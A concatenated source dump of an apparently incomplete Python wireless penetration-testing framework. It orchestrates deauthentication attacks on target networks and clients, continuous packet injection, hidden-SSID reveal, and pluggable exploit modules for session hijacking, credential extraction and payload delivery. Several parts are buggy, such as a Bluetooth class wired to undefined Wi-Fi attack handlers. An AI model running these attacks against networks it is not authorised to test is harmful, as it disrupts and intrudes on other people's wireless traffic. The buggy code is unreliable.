# main.py
# main.py

#!/usr/bin/env python3

import sys
import logging
from ui.cli import cli  # Ensure the import path is correct

def setup_logging():
    """
    Configures the root logger to ensure that logs are captured correctly.
    """
    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)  # Set to DEBUG to capture all levels; adjust as needed

    # Create console handler with a higher log level
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)  # Set to INFO to reduce verbosity; adjust as needed

    # Create formatter and add it to the handlers
    formatter = logging.Formatter('[%(asctime)s] %(levelname)s - %(name)s - %(message)s')
    ch.setFormatter(formatter)

    # Add the handlers to the logger
    if not logger.handlers:
        logger.addHandler(ch)

def main():
    """
    The main entry point of the application.
    """
    setup_logging()

    try:
        # Pass command-line arguments to Click's CLI
        cli.main(args=sys.argv[1:], obj={})
    except Exception as e:
        logging.error(f"An error occurred while running the CLI: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()


# setup.py
# setup.py

from setuptools import setup, find_packages

setup(
    name='wireless_pen_test_lib',
    version='1.0.0',
    packages=find_packages(),
    install_requires=[
        'click',
        'PyYAML',
        'docker',
        'scapy',
        # Add other dependencies as needed
    ],
    entry_points={
        'console_scripts': [
            'wireless-pen-test=ui.cli:cli',
        ],
    },
)


# visualize_architecture.py
import matplotlib.pyplot as plt
import networkx as nx

# Creating a directed graph to represent the project architecture
G = nx.DiGraph()

# Adding nodes representing major components of the project
components = [
    "CoreFramework", "CLI (Click Commands)", "Scanners (BaseScanner)",
    "LocalScanner", "Protocol Modules", "NetworkInterfaceManager",
    "DataStorageManager", "AuthenticationTools", "Logger", "Vulnerability Database",
    "Scapy", "Netifaces", "Exploit Modules", "Reports"
]

G.add_nodes_from(components)

# Adding edges to represent relationships and dependencies
edges = [
    ("CLI (Click Commands)", "CoreFramework"),
    ("CoreFramework", "Scanners (BaseScanner)"),
    ("CoreFramework", "Protocol Modules"),
    ("CoreFramework", "NetworkInterfaceManager"),
    ("CoreFramework", "DataStorageManager"),
    ("CoreFramework", "AuthenticationTools"),
    ("CoreFramework", "Logger"),
    ("Scanners (BaseScanner)", "LocalScanner"),
    ("LocalScanner", "Scapy"),
    ("LocalScanner", "Netifaces"),
    ("LocalScanner", "Logger"),
    ("CoreFramework", "Vulnerability Database"),
    ("CoreFramework", "Exploit Modules"),
    ("CoreFramework", "Reports"),
    ("Logger", "Reports"),
]

G.add_edges_from(edges)

# Drawing the graph
plt.figure(figsize=(15, 10))
pos = nx.spring_layout(G, seed=42)  # Set seed for consistent layout

# Draw nodes
nx.draw_networkx_nodes(G, pos, node_size=2000, node_color="skyblue", edgecolors="black")

# Draw edges
nx.draw_networkx_edges(G, pos, arrowstyle="->", arrowsize=20, edge_color="grey")

# Draw labels
nx.draw_networkx_labels(G, pos, font_size=10, font_color="black")

plt.title("Interconnection of Components in Wireless Pen Test Lib Project", fontsize=16)
plt.axis("off")
plt.show()


# core/config_manager.py
import os
import yaml
import logging
from pydantic import BaseModel, Field, ValidationError

# Define configuration models
class GeneralConfig(BaseModel):
    interface: str
    report_directory: str
    log_level: str = 'INFO'  # Added missing field with default value

class EncryptionScannerConfig(BaseModel):
    scan_duration: int

class AuthBypassScannerConfig(BaseModel):
    scan_duration: int

class DosScannerConfig(BaseModel):
    scan_duration: int

class LocalScannerConfig(BaseModel):
    scan_duration: int
    interface: str
    vendor_lookup: bool

class ScannersConfig(BaseModel):
    encryption_scanner: EncryptionScannerConfig
    auth_bypass_scanner: AuthBypassScannerConfig
    dos_scanner: DosScannerConfig
    local_scanner: LocalScannerConfig

class SessionHijackingConfig(BaseModel):
    max_packets: int

class CredentialExtractionConfig(BaseModel):
    pass  # No required fields

class PayloadDeliveryConfig(BaseModel):
    payload_types: list
    default_duration: int

class ExploitsConfig(BaseModel):
    session_hijacking: SessionHijackingConfig
    credential_extraction: CredentialExtractionConfig
    payload_delivery: PayloadDeliveryConfig

class UIConfig(BaseModel):
    theme: str = 'light'  # Default theme

class ConfigModel(BaseModel):
    general: GeneralConfig = Field(default_factory=GeneralConfig)
    scanners: ScannersConfig
    exploits: ExploitsConfig
    ui: UIConfig = Field(default_factory=UIConfig)

class ConfigManager:
    """
    A class to manage application configuration.
    """
    def __init__(self, config_dir: str = None):
        self.project_root = os.path.abspath(os.path.dirname(__file__))
        self.config_dir = config_dir or os.path.join(self.project_root, 'config')
        self.default_config_path = os.path.join(self.config_dir, 'default_config.yaml')
        self.user_config_path = os.path.join(self.config_dir, 'config.yaml')
        self.config = None
        self.logger = logging.getLogger(__name__)
        self.load_config()

    def create_default_config(self):
        # Create default config if it doesn't exist
        if not os.path.exists(self.default_config_path):
            default_config = {
                'general': {
                    'interface': 'wlan0mon',
                    'report_directory': 'reports',
                    'log_level': 'INFO',
                },
                'scanners': {
                    'encryption_scanner': {'scan_duration': 10},
                    'auth_bypass_scanner': {'scan_duration': 15},
                    'dos_scanner': {'scan_duration': 5},
                    'local_scanner': {
                        'scan_duration': 8,
                        'interface': 'wlan0mon',
                        'vendor_lookup': True
                    },
                },
                'exploits': {
                    'session_hijacking': {'max_packets': 100},
                    'credential_extraction': {},
                    'payload_delivery': {
                        'payload_types': ['type1', 'type2'],
                        'default_duration': 30
                    },
                },
                'ui': {
                    'theme': 'dark'
                }
            }
            os.makedirs(self.config_dir, exist_ok=True)
            with open(self.default_config_path, 'w') as f:
                yaml.dump(default_config, f)

    def load_config(self):
        try:
            self.create_default_config()
            with open(self.default_config_path, 'r') as f:
                default_config = yaml.safe_load(f)
            self.logger.debug("Loaded default configuration.")

            if os.path.exists(self.user_config_path):
                with open(self.user_config_path, 'r') as f:
                    user_config = yaml.safe_load(f)
                self.logger.debug("Loaded user configuration.")
            else:
                user_config = {}
                self.logger.info("User configuration file not found. Using defaults.")

            # Merge configurations: user_config overrides default_config
            merged_config = self.merge_configs(default_config, user_config)

            self.config = ConfigModel(**merged_config)
        except (yaml.YAMLError, ValidationError) as e:
            self.logger.error(f"Error loading configuration: {e}")
            raise e

    def merge_configs(self, default, override):
        merged = default.copy()
        for key, value in override.items():
            if key in merged and isinstance(merged[key], dict):
                merged[key] = self.merge_configs(merged[key], value)
            else:
                merged[key] = value
        return merged

    def get_config(self):
        return self.config

if __name__=="__main__":
    configmgr = ConfigManager()
    print(configmgr.project_root)

# core/event_dispatcher.py
import logging
from collections import defaultdict

class EventDispatcher:
    """
    A simple event dispatcher that allows subscribing to and dispatching events.
    """
    def __init__(self):
        self.listeners = defaultdict(list)
        self.logger = logging.getLogger(self.__class__.__name__)

    def subscribe(self, event_type, callback):
        """
        Subscribes a callback function to a specific event type.
        :param event_type: The type/name of the event.
        :param callback: The function to call when the event is dispatched.
        """
        self.listeners[event_type].append(callback)
        self.logger.info(f"Subscribed to event '{event_type}': {callback.__name__}")

    def unsubscribe(self, event_type, callback):
        """
        Unsubscribes a callback function from a specific event type.
        :param event_type: The type/name of the event.
        :param callback: The function to remove from the event's listener list.
        """
        if callback in self.listeners[event_type]:
            self.listeners[event_type].remove(callback)
            self.logger.info(f"Unsubscribed from event '{event_type}': {callback.__name__}")

    def dispatch(self, event_type, *args, **kwargs):
        """
        Dispatches an event to all subscribed listeners.
        :param event_type: The type/name of the event.
        :param args: Positional arguments for the callback.
        :param kwargs: Keyword arguments for the callback.
        """
        self.logger.info(f"Dispatching event '{event_type}' to {len(self.listeners[event_type])} listeners.")
        for callback in self.listeners[event_type]:
            try:
                callback(*args, **kwargs)
            except Exception as e:
                self.logger.error(f"Error in callback '{callback.__name__}' for event '{event_type}': {e}")


# core/log_manager.py
import logging
import os
from logging.handlers import RotatingFileHandler
from core.config_manager import ConfigManager


class LogManager:
    """
    A class to configure logging for the application.
    """
    def __init__(self, config: ConfigManager):
        self.config = config.get_config()
        self.logger = logging.getLogger()
        self.configure_logging()

    def configure_logging(self):
        # Clear existing handlers
        if self.logger.hasHandlers():
            self.logger.handlers.clear()

        # Set log level
        log_level_str = self.config.general.log_level.upper()
        log_level = getattr(logging, log_level_str, logging.INFO)
        self.logger.setLevel(log_level)

        # Create log formatter
        formatter = logging.Formatter('[%(asctime)s] %(levelname)s - %(name)s - %(message)s')

        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)

        # File handler with rotation
        log_file = os.path.join(self.config.general.report_directory, '..', 'logs', 'app.log')
        os.makedirs(os.path.dirname(log_file), exist_ok=True)
        file_handler = RotatingFileHandler(log_file, maxBytes=5 * 1024 * 1024, backupCount=5)
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)

        self.logger.debug("Logging has been configured.")


# core/module_manager.py
import importlib
import os
import sys
import logging


class ModuleManager:
    def __init__(self, modules_path, event_dispatcher, core_framework):
        self.modules_path = modules_path
        self.modules = {}
        self.logger = logging.getLogger(self.__class__.__name__)
        self.event_dispatcher = event_dispatcher
        self.core_framework = core_framework
        self.load_modules()

    def load_modules(self):
        self.logger.info(f"Loading modules from {self.modules_path}")
        sys.path.insert(0, self.modules_path)

        for filename in os.listdir(self.modules_path):
            if filename.endswith(".py") and not filename.startswith("__"):
                module_name = filename[:-3]
                try:
                    module = importlib.import_module(module_name)
                    for attribute_name in dir(module):
                        attribute = getattr(module, attribute_name)
                        if isinstance(attribute, type):
                            from core.config.protocols.base_protocol import BaseProtocol
                            if issubclass(attribute, BaseProtocol) and attribute != BaseProtocol:
                                instance = attribute(interface='wlan0mon', core=self.core_framework)
                                instance.register(self.event_dispatcher)
                                self.modules[module_name] = instance
                                self.logger.info(f"Loaded and registered protocol module: {module_name}")
                except Exception as e:
                    self.logger.error(f"Failed to load module {module_name}: {e}")

        sys.path.pop(0)

    def get_module(self, module_name):
        return self.modules.get(module_name, None)

    def list_modules(self):
        return list(self.modules.keys())


# core/report_generator.py
import os
import json
import logging
from jinja2 import Environment, FileSystemLoader
import pdfkit
from core.config_manager import ConfigManager


class ReportGenerator:
    """
    A class to generate reports based on the results from scanners and exploits
    """
    def __init__(self, config, scanners, exploits):
        self.config = config
        self.scanners = scanners
        self.exploits = exploits
        self.logger = logging.getLogger(self.__class__.__name__)
        self.env = Environment(loader=FileSystemLoader(searchpath=os.path.join(os.getcwd(), 'templates')))
        self.template = self.env.get_template('report_template.html')
        self.ensure_report_directories()

    def ensure_report_directories(self):
        os.makedirs(os.path.join(self.config.general.report_directory, 'html'), exist_ok=True)
        os.makedirs(os.path.join(self.config.general.report_directory, 'pdf'), exist_ok=True)
        os.makedirs(os.path.join(self.config.general.report_directory, 'json'), exist_ok=True)
        self.logger.debug("Report directories are ensured.")

    def generate_reports(self):
        # Gather data from scanners and exploits
        report_data = {
            'scanners': {},
            'exploits': {}
        }

        for sc_name, scanner in self.scanners.items():
            report_data['scanners'][sc_name] = {
                'results': scanner.detected_vulnerabilities
            }

        for ex_name, exploit in self.exploits.items():
            report_data['exploits'][ex_name] = {
                'results': exploit.detected_vulnerabilities
            }

        # Generate JSON report
        json_report_path = os.path.join(self.config.general.report_directory, 'json', 'report.json')
        with open(json_report_path, 'w') as f:
            json.dump(report_data, f, indent=4)
        self.logger.info(f"JSON report generated at {json_report_path}")

        # Generate HTML report using Jinja2 template
        html_content = self.template.render(report=report_data)
        html_report_path = os.path.join(self.config.general.report_directory, 'html', 'report.html')
        with open(html_report_path, 'w') as f:
            f.write(html_content)
        self.logger.info(f"HTML report generated at {html_report_path}")

        # Convert HTML to PDF
        pdf_report_path = os.path.join(self.config.general.report_directory, 'pdf', 'report.pdf')
        try:
            pdfkit.from_file(html_report_path, pdf_report_path)
            self.logger.info(f"PDF report generated at {pdf_report_path}")
        except Exception as e:
            self.logger.error(f"Failed to generate PDF report: {e}")

    def create_html_template(self):
        # Create a simple HTML template if it doesn't exist
        templates_dir = os.path.join(os.getcwd(), 'templates')
        os.makedirs(templates_dir, exist_ok=True)
        template_path = os.path.join(templates_dir, 'report_template.html')
        if not os.path.exists(template_path):
            with open(template_path, 'w') as f:
                f.write("""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>WirelessPenTestLib Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        h1, h2, h3 { color: #333; }
        table { width: 100%; border-collapse: collapse; margin-bottom: 40px; }
        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .summary { background-color: #e6f7ff; padding: 10px; border: 1px solid #91d5ff; }
    </style>
</head>
<body>
    <h1>WirelessPenTestLib Report</h1>

    <div class="summary">
        <h2>Summary</h2>
        <p>Total Scanners Run: {{ report.scanners | length }}</p>
        <p>Total Exploits Run: {{ report.exploits | length }}</p>
    </div>

    <h2>Scanners Results</h2>
    {% for sc_name, sc_data in report.scanners.items() %}
        <h3>{{ sc_name.replace('_', ' ').title() }}</h3>
        {% if sc_data.results %}
            <table>
                <thead>
                    <tr>
                        <th>SSID</th>
                        <th>BSSID</th>
                        <th>Protocol</th>
                        <th>Description</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody>
                    {% for vuln in sc_data.results %}
                        <tr>
                            <td>{{ vuln.ssid }}</td>
                            <td>{{ vuln.bssid }}</td>
                            <td>{{ vuln.protocol }}</td>
                            <td>{{ vuln.description }}</td>
                            <td>{{ vuln.action }}</td>
                        </tr>
                    {% endfor %}
                </tbody>
            </table>
        {% else %}
            <p>No vulnerabilities detected.</p>
        {% endif %}
    {% endfor %}

    <h2>Exploits Results</h2>
    {% for ex_name, ex_data in report.exploits.items() %}
        <h3>{{ ex_name.replace('_', ' ').title() }}</h3>
        {% if ex_data.results %}
            <table>
                <thead>
                    <tr>
                        <th>Target</th>
                        <th>Description</th>
                        <th>Status</th>
                        <th>Action Taken</th>
                    </tr>
                </thead>
                <tbody>
                    {% for vuln in ex_data.results %}
                        <tr>
                            <td>{{ vuln.target }}</td>
                            <td>{{ vuln.description }}</td>
                            <td>{{ vuln.status }}</td>
                            <td>{{ vuln.action_taken }}</td>
                        </tr>
                    {% endfor %}
                </tbody>
            </table>
        {% else %}
            <p>No exploitation activities performed.</p>
        {% endif %}
    {% endfor %}

    <footer>
        <p>Report generated on {{ time }}</p>
    </footer>
</body>
</html>""")
            self.logger.info(f"HTML template created at {template_path}")


# core/task_scheduler.py
import threading
import logging

class TaskScheduler:
    """
    A simple task scheduler that can run tasks sequentially or concurrently.
    """
    def __init__(self):
        self.tasks = []
        self.logger = logging.getLogger(self.__class__.__name__)

    def add_task(self, task, *args, **kwargs):
        """
        Adds a task to the scheduler.
        :param task: The function to execute.
        :param args: Arguments for the task.
        :param kwargs: Keyword arguments for the task.
        """
        self.tasks.append((task, args, kwargs))
        self.logger.info(f"Task added: {task.__name__}")

    def run_sequential(self):
        """
        Runs all tasks sequentially.
        """
        self.logger.info("Starting sequential task execution.")
        for task, args, kwargs in self.tasks:
            try:
                self.logger.info(f"Executing task: {task.__name__}")
                task(*args, **kwargs)
            except Exception as e:
                self.logger.error(f"Error executing task {task.__name__}: {e}")
        self.logger.info("Sequential task execution completed.")

    def run_concurrent(self, max_threads=5):
        """
        Runs tasks concurrently using threading.
        :param max_threads: Maximum number of concurrent threads.
        """
        self.logger.info("Starting concurrent task execution.")
        threads = []
        for task, args, kwargs in self.tasks:
            while threading.active_count() > max_threads:
                pass  # Wait until there's a free thread
            thread = threading.Thread(target=self._execute_task, args=(task, args, kwargs))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()
        self.logger.info("Concurrent task execution completed.")

    def _execute_task(self, task, args, kwargs):
        """
        Helper method to execute a single task.
        """
        try:
            self.logger.info(f"Executing task: {task.__name__}")
            task(*args, **kwargs)
        except Exception as e:
            self.logger.error(f"Error executing task {task.__name__}: {e}")


# core/__init__.py
import os
import logging
import threading
import time
import json
import importlib.util
from scapy.all import sendp
from modules.network_enumeration.hidden_ssid_reveal import HiddenSSIDRevealer
from modules.network_enumeration.signal_heatmap import SignalHeatmap
from test_network.manage import start_network, stop_network, status_network
from core.config_manager import ConfigManager
from project_specific_utils.network_interface_manager import NetworkInterfaceManager
from project_specific_utils.data_storage_manager import DataStorageManager
from project_specific_utils.authentication_tools import AuthenticationTools
from modules.machine_learning.anomaly_detection import AnomalyDetector
from modules.data_analytics.report_generator import ReportGenerator
from modules.network_enumeration.beacon_analyzer import BeaconAnalyzer
from modules.attack_modules.deauth_attack import DeauthAttack
from typing import List, Dict, Any
import pandas as pd

def setup_core_logging(project_root: str) -> logging.Logger:
    logs_dir = os.path.join(project_root, 'logs')
    os.makedirs(logs_dir, exist_ok=True)

    log_file = os.path.join(logs_dir, 'core_framework.log')

    logger = logging.getLogger('CoreFramework')
    logger.setLevel(logging.DEBUG)

    formatter = logging.Formatter('[%(asctime)s] %(levelname)s - %(name)s - %(message)s')

    file_handler = logging.FileHandler(log_file)
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)

    stream_handler = logging.StreamHandler()
    stream_handler.setLevel(logging.INFO)
    stream_handler.setFormatter(formatter)

    if not logger.handlers:
        logger.addHandler(file_handler)
        logger.addHandler(stream_handler)

    return logger

class CoreFramework:
    def __init__(self, modules_path: str = "core/config/protocols",
                 config_dir: str = "core/config",
                 vulnerabilities_path: str = None,
                 sendp_func=sendp,
                 sleep_func=time.sleep,
                 network_manager=None,
                 data_storage_manager=None,
                 auth_tools=None,
                 scanners=None,
                 exploits=None,
                 test_network: bool=False,
                 interface: str='wlan0'):
        self.stop_event = threading.Event()
        self.modules_path = modules_path
        self.compose_file_path = os.path.join(modules_path, 'test_network', 'docker-compose.yml')
        self.project_root = os.path.abspath(os.path.join(modules_path, os.pardir, os.pardir))
        self.logger = setup_core_logging(self.project_root)
        self.logger.info("Initializing CoreFramework...")
        self.hidden_ssid_revealer = HiddenSSIDRevealer(interface='wlan0', stop_event=self.stop_event)
        self.signal_heatmap = SignalHeatmap(interface='wlan0', stop_event=self.stop_event)
        self.beacon_analyzer = BeaconAnalyzer(interface='wlan0', stop_event=self.stop_event)
        self.deauth_attacks: List[DeauthAttack] = []
        self.interface = interface

        try:
            self.config_manager = ConfigManager(config_dir=config_dir)
            self.config = self.config_manager.get_config()
            self.logger.info("Configuration loaded successfully.")
        except Exception as e:
            self.logger.error(f"Error loading configuration: {e}", exc_info=True)
            raise

        required_general_keys = ['interface', 'report_directory']
        missing_keys = [key for key in required_general_keys if not hasattr(self.config.general, key)]
        if missing_keys:
            self.logger.error(f"Missing keys in general configuration: {missing_keys}")
            raise AttributeError(f"Missing keys in general configuration: {missing_keys}")

        if vulnerabilities_path:
            path_to_vulnerabilities = vulnerabilities_path
        else:
            path_to_vulnerabilities = os.path.join(self.project_root, 'vulnerabilities', 'vulnerabilities.json')

        vulnerabilities_dir = os.path.dirname(path_to_vulnerabilities)
        os.makedirs(vulnerabilities_dir, exist_ok=True)

        try:
            if not os.path.isfile(path_to_vulnerabilities):
                self.logger.warning(f"Vulnerability database not found at {path_to_vulnerabilities}. Creating a new one.")
                with open(path_to_vulnerabilities, 'w') as f:
                    json.dump({}, f, indent=4)
                self.vulnerability_db = {}
            else:
                with open(path_to_vulnerabilities, 'r') as f:
                    self.vulnerability_db = json.load(f)
                if not isinstance(self.vulnerability_db, dict):
                    self.logger.error(f"Vulnerability database must be a dictionary. Found type: {type(self.vulnerability_db)}")
                    raise TypeError("Vulnerability database must be a dictionary.")
                self.logger.info(f"Loaded vulnerability database from {path_to_vulnerabilities}.")
        except (FileNotFoundError, json.JSONDecodeError, TypeError) as e:
            self.logger.warning(f"Error loading vulnerability database: {e}. Initializing empty vulnerability database.", exc_info=True)
            self.vulnerability_db = {}

        try:
            self.network_manager = network_manager if network_manager else NetworkInterfaceManager(interface=self.config.general.interface)
            self.data_storage_manager = data_storage_manager if data_storage_manager else DataStorageManager(report_directory=self.config.general.report_directory)
            self.auth_tools = auth_tools if auth_tools else AuthenticationTools()
            self.logger.info("Network and Data Storage Managers initialized successfully.")
        except Exception as e:
            self.logger.error(f"Error initializing components: {e}", exc_info=True)
            raise

        try:
            self.test_network = test_network
            if self.test_network:
                self.start_test_network(self.config.test_network.compose_file)
        except Exception as e:
            self.logger.error(f"Error starting test network: {e}", exc_info=True)
            raise

        self.scanners = scanners if scanners else {}
        self.exploits = exploits if exploits else {}

        self.sendp = sendp_func
        self.sleep = sleep_func

        try:
            self.load_protocol_modules()
        except Exception as e:
            self.logger.error(f"Failed to load protocol modules: {e}", exc_info=True)
            raise

        self.logger.info("CoreFramework initialized successfully.")

    def run_local_scan(self, interface: str):
        self.logger.info(f"Running local scan on interface: {interface}")
        try:
            self.network_manager.set_monitor_mode()
            self.network_manager.start_scanning()
            self.sleep(30)
            self.network_manager.stop_scanning()
            self.network_manager.set_managed_mode()
            self.logger.info("Local scan completed successfully.")
        except Exception as e:
            self.logger.error(f"Error running local scan: {e}", exc_info=True)
            raise

    def set_interface(self, iface: str):
        self.interface = iface

    def stop_all_operations(self):
        self.logger.info("Stopping all operations...")
        self.stop_event.set()
        self.stop_test_network()
        self.stop_continuous_packets()
        self.logger.info("All operations stopped successfully.")

    def start_signal_heatmap(self):
        self.signal_heatmap.run()

    def generate_heatmap(self):
        self.signal_heatmap.generate_heatmap()

    def load_protocol_modules(self):
        protocols_dir = self.modules_path
        self.logger.info(f"Loading protocol modules from {protocols_dir}...")

        if not os.path.isdir(protocols_dir):
            self.logger.error(f"Protocols directory not found at {protocols_dir}.")
            raise FileNotFoundError(f"Protocols directory not found at {protocols_dir}.")

        for filename in os.listdir(protocols_dir):
            if filename.endswith('.py') and filename != '__init__.py':
                module_name = filename[:-3]
                file_path = os.path.join(protocols_dir, filename)
                self.logger.debug(f"Loading module '{module_name}' from '{file_path}'.")
                try:
                    spec = importlib.util.spec_from_file_location(module_name, file_path)
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)

                    if hasattr(module, 'register_scanner'):
                        scanner = module.register_scanner()
                        if scanner.name in self.scanners:
                            self.logger.warning(f"Scanner '{scanner.name}' is already registered. Skipping.")
                        else:
                            self.scanners[scanner.name] = scanner
                            self.logger.info(f"Registered scanner: {scanner.name}")

                    if hasattr(module, 'register_exploit'):
                        exploit = module.register_exploit()
                        if exploit.name in self.exploits:
                            self.logger.warning(f"Exploit '{exploit.name}' is already registered. Skipping.")
                        else:
                            self.exploits[exploit.name] = exploit
                            self.logger.info(f"Registered exploit: {exploit.name}")

                except Exception as e:
                    self.logger.error(f"Failed to load module '{module_name}': {e}", exc_info=True)

        self.logger.info("Protocol modules loaded successfully.")

    def execute_deauth_attack(self, interface: str, target_bssid: str, target_client: str = None):
        stop_event = threading.Event()
        attack = DeauthAttack(interface, target_bssid, target_client, stop_event)
        attack.start_attack()
        self.deauth_attacks.append(attack)

    def stop_all_deauth_attacks(self):
        for attack in self.deauth_attacks:
            attack.stop_attack()
        self.deauth_attacks = []

    def run_scanner(self, scanner_name: str, target_info: dict):
        scanner = self.scanners.get(scanner_name)
        if not scanner:
            self.logger.error(f"Scanner '{scanner_name}' not found.")
            raise ValueError(f"Scanner '{scanner_name}' not found.")
        self.logger.info(f"Running scanner: {scanner_name} on target: {target_info}")
        try:
            vulnerabilities = scanner.scan(target_info)
            self.logger.debug(f"Vulnerabilities found by {scanner_name}: {vulnerabilities}")
            for key, value in vulnerabilities.items():
                if key not in self.vulnerability_db:
                    self.vulnerability_db[key] = []
                self.vulnerability_db[key].extend(value)
            self.logger.info(f"Scanner '{scanner_name}' completed successfully.")
        except Exception as e:
            self.logger.error(f"Error running scanner '{scanner_name}': {e}", exc_info=True)
            raise

    def start_beacon_analysis(self):
        self.beacon_analyzer.run()

    def get_access_points(self):
        return self.beacon_analyzer.get_access_points()

    def start_hidden_ssid_reveal(self):
        self.hidden_ssid_revealer.run()

    def get_hidden_ssids(self):
        return self.hidden_ssid_revealer.get_hidden_ssids()

    def run_exploit(self, exploit_name: str, vuln_info: dict):
        exploit = self.exploits.get(exploit_name)
        if not exploit:
            self.logger.error(f"Exploit '{exploit_name}' not found.")
            raise ValueError(f"Exploit '{exploit_name}' not found.")
        self.logger.info(f"Running exploit: {exploit_name} with vulnerability info: {vuln_info}")
        try:
            vulnerabilities = exploit.execute(vuln_info)
            self.logger.debug(f"Vulnerabilities affected by {exploit_name}: {vulnerabilities}")
            for key, value in vulnerabilities.items():
                if key not in self.vulnerability_db:
                    self.vulnerability_db[key] = []
                self.vulnerability_db[key].extend(value)
            self.logger.info(f"Exploit '{exploit_name}' completed successfully.")
        except Exception as e:
            self.logger.error(f"Error running exploit '{exploit_name}': {e}", exc_info=True)
            raise

    def start_test_network(self, compose_file: str = None):
        if not compose_file:
            self.logger.info("Starting test network...")
            start_network(self.compose_file_path)

        if self.test_network:
            self.logger.info("Starting test network...")
            start_network(compose_file)

    def stop_test_network(self, compose_file: str):
        if self.test_network is False:
            self.logger.warning("Test network is not enabled. Skipping stop operation.")
            return
        stop_network(compose_file)

    def send_continuous_packets(self, packet, interval: float):
        self.logger.info(f"Starting to send packets every {interval} seconds.")
        self.continuous_sending = True
        while self.continuous_sending:
            try:
                self.sendp(packet, iface=self.network_manager.interface, verbose=False)
                self.sleep(interval)
            except Exception as e:
                self.logger.error(f"Error sending packet: {e}", exc_info=True)
                self.continuous_sending = False

    def stop_continuous_packets(self):
        self.logger.info("Stopping continuous packet sending.")
        self.continuous_sending = False

    def perform_anomaly_detection(self, traffic_data: List[Dict[str, Any]]) -> pd.DataFrame:
        df = pd.DataFrame(traffic_data)
        detector = AnomalyDetector(df)
        detector.train_model()
        anomalies = detector.detect_anomalies()
        return anomalies

    def get_scan_results(self):
        pass

    def get_exploit_results(self):
        pass

    def get_additional_report_data(self):
        pass

    def generate_detailed_report(self, scan_results: Dict[str, Any], exploit_results: Dict[str, Any],
                                 report_data: Dict[str, Any], export_format: str, file_path: str):
        reporter = ReportGenerator(scan_results, exploit_results, report_data)
        if export_format == 'pdf':
            reporter.generate_pdf_report(file_path)
        elif export_format == 'json':
            reporter.export_json(file_path)
        elif export_format == 'csv':
            reporter.export_csv(file_path)

    def generate_report(self, vulnerability_db: dict, format: str = 'json'):
        """
        Generates a report based on the vulnerability database.

        Args:
            vulnerability_db (dict): Dictionary containing detected vulnerabilities.
        """
        self.logger.info("Generating reports...")
        # Ensure report directories exist
        json_dir = os.path.join(self.report_directory, "json")
        txt_dir = os.path.join(self.report_directory, "txt")
        os.makedirs(json_dir, exist_ok=True)
        os.makedirs(txt_dir, exist_ok=True)

        # JSON Report
        if format == 'json':
            json_report_path = os.path.join(json_dir, "report.json")
            with open(json_report_path, 'w') as f:
                json.dump(vulnerability_db, f, indent=4)
            self.logger.info(f"JSON report generated at {json_report_path}")

        # TXT Report
        elif format == 'txt':
            txt_report_path = os.path.join(txt_dir, "report.txt")
            with open(txt_report_path, 'w') as f:
                for scanner, vulnerabilities in vulnerability_db.get('scans', {}).items():
                    f.write(f"Scanner: {scanner}\n")
                    for vuln in vulnerabilities:
                        f.write(f"  - SSID: {vuln.get('ssid', 'N/A')}\n")
                        f.write(f"    BSSID: {vuln.get('bssid', 'N/A')}\n")
                        f.write(f"    Protocol: {vuln.get('protocol', 'N/A')}\n")
                        f.write(f"    Description: {vuln.get('description', 'N/A')}\n")
                for exploit, vulnerabilities in vulnerability_db.get('exploits', {}).items():
                    f.write(f"Exploit: {exploit}\n")
                    for vuln in vulnerabilities:
                        f.write(f"  - BSSID: {vuln.get('bssid', 'N/A')}\n")
                        f.write(f"    Description: {vuln.get('description', 'N/A')}\n")
                        f.write(f"    Action: {vuln.get('action', 'N/A')}\n")
            self.logger.info(f"TXT report generated at {txt_report_path}")

        self.logger.info("Reports generated successfully.")

    def finalize(self):
        self.logger.info("Finalizing testing activities...")
        try:
            self.data_storage_manager.generate_report(self.vulnerability_db)
            self.logger.info("Finalization and report generation completed successfully.")
        except Exception as e:
            self.logger.error(f"Error during finalization: {e}", exc_info=True)
            raise

# core/config/__init__.py



# core/config/protocols/base_protocol.py
from abc import ABC, abstractmethod

class BaseProtocol(ABC):
    def __init__(self, name):
        self.name = name

    def execute(self):
        raise NotImplementedError("This method should be implemented by subclasses")

    @abstractmethod
    def register(self, event_dispatcher):
        """
        Registers event listeners with the Event Dispatcher.
        """
        pass

    @abstractmethod
    def start(self):
        """
        Starts the protocol-specific operations (e.g., sniffing, injection).
        """
        pass

    @abstractmethod
    def stop(self):
        """
        Stops the protocol-specific operations.
        """
        pass


# core/config/protocols/bluetooth.py
from scapy.all import *
from scapy.layers.bluetooth import *
import threading
import logging
from core.config.protocols.base_protocol import BaseProtocol



class BluetoothProtocol(BaseProtocol):
    def __init__(self, interface='hci0'):
        self.interface = interface
        self.scanning = False
        self.logger = logging.getLogger(self.__class__.__name__)
        self.scan_results = {}
        self.scan_thread = None

    def register(self, event_dispatcher):
        """
        Registers event listeners relevant to Wi-Fi operations.
        """
        # Existing subscriptions
        event_dispatcher.subscribe('start_scan', self.start_scan)
        event_dispatcher.subscribe('stop_scan', self.stop_scan)
        event_dispatcher.subscribe('start_deauth', self.start_deauth)
        event_dispatcher.subscribe('stop_deauth', self.stop_deauth)
        # New subscriptions
        event_dispatcher.subscribe('start_beacon_flood', self.start_beacon_flood)
        event_dispatcher.subscribe('stop_beacon_flood', self.stop_beacon_flood)
        self.logger.info("WiFiProtocol registered to Event Dispatcher.")


    def start(self):
        """
        Starts Bluetooth operations.
        """
        self.logger.info("Starting Bluetooth Protocol operations.")
        self.scanning = True
        self.scan_thread = threading.Thread(target=self.scan_devices)
        self.scan_thread.start()

    def stop(self):
        """
        Stops Bluetooth operations.
        """
        self.logger.info("Stopping Bluetooth Protocol operations.")
        self.scanning = False
        if self.scan_thread and self.scan_thread.is_alive():
            self.scan_thread.join()

    def scan_devices(self):
        """
        Scans for Bluetooth devices.
        """
